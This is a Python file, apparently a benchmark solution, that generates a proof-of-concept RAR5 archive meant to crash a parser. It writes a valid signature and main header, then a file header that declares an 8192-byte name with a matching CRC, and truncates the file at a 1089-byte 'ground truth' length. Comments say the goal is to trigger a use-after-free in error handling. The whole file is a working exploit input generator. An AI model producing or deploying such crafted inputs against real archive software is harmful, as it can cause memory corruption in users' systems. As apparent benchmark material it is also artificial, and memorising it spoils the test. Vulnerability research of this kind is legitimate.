import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def to_vint(n):
            bs = bytearray()
            while True:
                byte = n & 0x7F
                n >>= 7
                if n:
                    bs.append(byte | 0x80)
                else:
                    bs.append(byte)
                    break
            return bytes(bs)

        # RAR5 Signature: Rar!\x1a\x07\x01\x00
        signature = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # --- Main Archive Header (Type 1) ---
        # Fields: Type(vint), HeaderFlags(vint), ArchiveFlags(vint)
        # Type=1 (Main), Flags=0, ArcFlags=0
        mh_fields = to_vint(1) + to_vint(0) + to_vint(0)
        
        # CRC is calculated over the fields (Data area of the block)
        mh_crc = zlib.crc32(mh_fields) & 0xFFFFFFFF
        mh_size = len(mh_fields)
        
        # Block: CRC(4) + Size(vint) + Fields
        main_header = struct.pack('<I', mh_crc) + to_vint(mh_size) + mh_fields

        # --- File Header (Type 2) ---
        # Vulnerability involves reading name size, then name, then checking limit.
        # We declare a NameSize larger than typical limits (e.g. > 4096) to trigger
        # large allocation and potential UAF in error handling/cleanup when file is truncated.
        name_size_declared = 8192
        
        # Fields: Type(2), HFlags(0), FileFlags(0), UnpSize(0), Attr(0), Comp(0), OS(0), NameSize(...)
        fh_fields = (
            to_vint(2) +        # Type: File Header
            to_vint(0) +        # HeaderFlags
            to_vint(0) +        # FileFlags
            to_vint(0) +        # UnpackedSize
            to_vint(0) +        # Attributes
            to_vint(0) +        # CompressionInfo
            to_vint(0) +        # HostOS
            to_vint(name_size_declared) # NameSize
        )
        
        # To calculate correct CRC and Size, we simulate the full block as if the name was present
        full_name_padding = b'A' * name_size_declared
        fh_full_data = fh_fields + full_name_padding
        
        fh_crc = zlib.crc32(fh_full_data) & 0xFFFFFFFF
        fh_size = len(fh_full_data)
        
        # Construct the partial block (truncated file)
        file_header_prefix = struct.pack('<I', fh_crc) + to_vint(fh_size) + fh_fields
        
        # Assemble PoC
        poc = bytearray()
        poc.extend(signature)
        poc.extend(main_header)
        poc.extend(file_header_prefix)
        
        # Fill with partial name data up to the ground truth length (1089 bytes)
        target_len = 1089
        current_len = len(poc)
        if current_len < target_len:
            poc.extend(b'A' * (target_len - current_len))
            
        return bytes(poc)